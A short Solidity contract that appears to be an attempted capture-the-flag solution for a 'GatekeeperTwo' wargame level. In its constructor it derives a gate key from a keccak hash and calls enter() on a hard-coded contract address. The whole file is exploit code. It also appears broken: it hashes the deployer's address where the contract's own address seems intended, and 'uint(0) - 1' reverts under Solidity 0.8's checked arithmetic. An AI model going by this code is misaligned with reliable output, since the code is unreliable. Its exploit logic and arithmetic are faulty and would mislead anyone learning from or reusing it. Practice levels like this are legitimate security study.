// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/level14.sol";
import "forge-std/console.sol";

contract GateKeeperTwoAttack
{
    GatekeeperTwo gateKeeperTwo = GatekeeperTwo(0xEd33dA85C73EAFE296e96c137413cf91bC8cfD02);

    constructor() public {
        uint256 _gateKey = uint256(uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))) ^ (uint(0) - 1);
        bytes8 j = bytes8(uint64(_gateKey));
        gateKeeperTwo.enter(j);
    }
   
}
